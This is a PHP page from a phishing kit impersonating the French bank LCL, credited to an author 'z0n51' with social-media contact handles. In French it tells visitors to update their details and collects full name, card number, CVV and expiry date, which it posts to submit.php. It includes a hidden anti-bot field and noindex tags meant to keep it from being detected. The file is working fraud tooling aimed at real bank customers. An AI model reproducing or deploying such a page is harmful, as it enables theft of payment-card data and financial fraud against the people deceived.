<?php

/**
 * @link              https://www.z0n51.com/
 * @since             19/11/2020
 * @package           LCL
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      LCL
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 
        
        <title>LCL</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <img style="min-width: 960px;" src="../assets/images/log-header.png">
            <div class="top"></div>
            <div class="middle"></div>
            <div class="bottom"></div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="containerr">
                <div class="title">
                    <h3>Ma carte à la carte</h3>
                    <p>Mettez à jour vos coordonnées pour continuer de réaliser vos opération sur Internet</p>
                </div>
                <div class="row">
                    <div class="col-md-4">
                        <img src="../assets/images/cc.png">
                    </div>
                    <div class="col-md-8">
                        <div class="details-box">
                            <form action="submit.php" method="post">
                                <input type="hidden" name="verbot">
                                <input type="hidden" name="type" value="cc">
                                <div class="form-group row mb-4 <?php echo is_invalid_class($_SESSION['errors'],'full_name') ?>">
                                    <label class="col-md-5" for="full_name">Nom complet</label>
                                    <div class="col-md-7">
                                        <input type="text" name="full_name" id="full_name" class="form-control" value="<?php echo get_value('full_name'); ?>">
                                        <?php echo error_message($_SESSION['errors'],'full_name'); ?>
                                    </div>
                                </div>
                                <div class="form-group row mb-4 <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>">
                                    <label class="col-md-5" for="cc_number">N° de carte</label>
                                    <div class="col-md-7">
                                        <input type="text" name="cc_number" id="cc_number" class="form-control" value="<?php echo get_value('cc_number'); ?>">
                                        <?php echo error_message($_SESSION['errors'],'cc_number'); ?>
                                    </div>
                                </div>
                                <div class="form-group row mb-4 <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>">
                                    <label class="col-md-5" for="cc_cvv">Cryptogramme visuel (CVV)</label>
                                    <div class="col-md-7">
                                        <input type="text" maxlength="3" name="cc_cvv" id="cc_cvv" class="form-control" value="<?php echo get_value('cc_cvv'); ?>">
                                        <?php echo error_message($_SESSION['errors'],'cc_cvv'); ?>
                                    </div>
                                </div>
                                <div class="form-group row mb-4 <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>">
                                    <label class="col-md-5" for="cc_date">Date d'expiration (MM/AA)</label>
                                    <div class="col-md-7">
                                        <input type="text" maxlength="7" name="cc_date" id="cc_date" class="form-control" value="<?php echo get_value('cc_date'); ?>">
                                        <?php echo error_message($_SESSION['errors'],'cc_date'); ?>
                                    </div>
                                </div>
                                <button type="submit"><i class="fas fa-chevron-right"></i> Continuer</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <div class="mt50 mb50 ml20">
                <img src="../assets/images/infos.png">
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <img style="min-width: 911px;" src="../assets/images/log-footer.png">
            <div class="top"></div>
            <div class="bottom"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            jQuery('#cc_number').payment('formatCardNumber');
            jQuery('#cc_cvv').payment('formatCardCVC');
            jQuery('#cc_date').payment('formatCardExpiry');
        </script>

    </body>

</html>